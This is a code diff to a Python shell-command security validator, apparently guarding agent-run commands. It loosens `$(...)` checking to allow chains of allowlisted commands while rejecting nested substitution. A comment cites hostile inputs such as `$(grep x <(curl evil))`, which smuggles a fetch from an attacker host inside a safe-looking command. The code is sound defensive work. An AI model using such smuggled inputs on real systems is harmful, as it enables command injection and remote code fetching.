@@ -1009,20 +1009,49 @@ def _extract_dollar_paren_inners(text: str) -> list[str]:
 
 
 def _is_safe_substitution_inner(inner: str) -> bool:
-    """True if the body of a ``$(...)`` is a known-safe read-only command."""
+    """True if the body of a ``$(...)`` is a flat pipe/chain of safe commands.
+
+    Task 2722: real dev commands routinely pipe or chain read-only commands
+    inside ``$(...)`` — e.g.::
+
+        FILES=$(grep -rln "pat" tests/ | tr "\\n" " ")
+        PYBIN=$( [ -x .venv/bin/python ] && echo .venv/bin/python || echo python )
+
+    The prior implementation (fixes 2284/2308) rejected on the mere *presence*
+    of a ``|``/``&&``/``;`` separator, so both of the above benign commands
+    tripped check-8 and killed live agent runs. Mirroring the 2652 principle
+    (validate structure, don't pattern-match the raw string) we instead SPLIT
+    the inner on shell-level separators (reusing the quote-aware check-4
+    tokenizer ``_split_command_segments``) and return True only when EVERY
+    sub-command base is in ``_SAFE_SUBSTITUTION_COMMANDS`` and NONE is in
+    ``_DANGEROUS_SUBSTITUTION_COMMANDS``.
+
+    Nested substitution stays an automatic REJECT — we do not recurse. Any
+    ``$(...)``/backtick/``<()``/``>()``/``${...}`` form inside the inner blocks
+    the whole substitution; only a flat chain of allowlisted commands passes.
+    """
     stripped = inner.strip()
     if not stripped:
         return False
-    # Reject anything with shell separators or pipes inside — keeps the
-    # allowlist surface minimal. Single-command substitutions only.
-    if re.search(r"[;&|]|\$\(|`", stripped):
+    # Nested substitution / expansion inside an inner is never allowed — only a
+    # flat pipe/chain of safe commands. Rejecting these fails closed and stops
+    # e.g. `$(echo $(whoami))` or `$(grep x <(curl evil))` from slipping through
+    # on a safe-looking base command.
+    for forbidden in ("`", "$(", "${", "<(", ">("):
+        if forbidden in stripped:
+            return False
+    segments = _split_command_segments(stripped)
+    if not segments:
         return False
-    base = _get_base_command(stripped)
-    if base in _DANGEROUS_SUBSTITUTION_COMMANDS:
-        return False
-    if base in _SAFE_SUBSTITUTION_COMMANDS:
-        return True
-    return False
+    for segment in segments:
+        base = _get_base_command(segment)
+        if not base:
+            return False
+        if base in _DANGEROUS_SUBSTITUTION_COMMANDS:
+            return False
+        if base not in _SAFE_SUBSTITUTION_COMMANDS:
+            return False
+    return True
 
 
 def _check_command_substitution(unquoted: str) -> BashSecurityResult:
@@ -1808,7 +1837,8 @@ _SAFE_SUBSTITUTION_COMMANDS: frozenset[str] = frozenset([
     "id", "whoami", "hostname", "uname",
     "which", "type", "command",
     "env",
-    "expr", "test",
+    "expr", "test", "[",   # `[` is the test builtin: `[ -x path ]`
+    "true", "false",       # no-op status commands, common chain fallbacks
 ])
 
 # Commands that MUST NEVER appear inside $() — these are the dangerous side
